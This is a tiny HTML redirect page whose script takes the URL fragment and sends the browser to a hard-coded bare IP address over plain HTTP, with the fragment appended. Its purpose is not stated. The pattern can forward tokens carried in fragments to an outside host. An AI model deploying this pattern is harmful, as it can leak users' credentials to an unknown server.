<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
  <script>
    // Extract the fragment (after #) from the URL
    const fragment = window.location.hash.substring(1); // removes the leading "#"
    
    // Define the base URL you want to redirect to
    const targetBaseUrl = 'http://23.170.241.4/';
    
    // Redirect to the target URL combined with the fragment
    if (fragment) {
      window.location.href = targetBaseUrl + fragment;
    } else {
      console.log("No fragment found in the URL.");
    }
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
